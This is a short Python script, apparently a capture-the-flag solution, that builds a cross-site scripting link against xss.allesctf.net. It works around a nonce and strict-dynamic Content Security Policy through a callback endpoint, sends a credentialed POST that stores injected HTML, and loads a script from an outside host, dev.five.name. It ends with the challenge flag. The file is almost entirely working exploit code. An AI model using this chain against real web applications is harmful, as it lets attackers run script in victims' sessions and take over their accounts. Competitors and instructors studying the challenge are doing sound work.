#!/usr/bin/env python3
from urllib.parse import quote
import html

# CSP: script-src 'nonce-9WHT8wGhD3aw3lqLgJWRYSoZsog=' 'unsafe-inline' 'strict-dynamic'; base-uri 'none'; object-src 'none';

FINAL_PAYLOAD = "<script src=http://dev.five.name></script>"
INJECT2 = '''
innerHTML"><div id="backgrounds">FINAL_PAYLOAD</div><!--
'''.strip().replace("FINAL_PAYLOAD", FINAL_PAYLOAD)

SRC1 = "http://xss.allesctf.net/items.php?cb=" + quote('l=$("a")[1].href;$.post({url: l, data: {"bg": x.value}, xhrFields: {withCredentials: true}}).always(function() { document.location = l;});');
INJECT1 = '''
<input id="x" name="bg" value="INJECT2">
<script defer src='SRC1'></script>
'''.replace("\n", "").replace("INJECT2", html.escape(INJECT2)).replace("SRC1", SRC1)

link = "http://xss.allesctf.net/?search=" + quote(INJECT1)

print(SRC1)
print("--")
print(link)

# CSCG{c0ngratZ_y0u_l3arnD_sUm_jS:>}
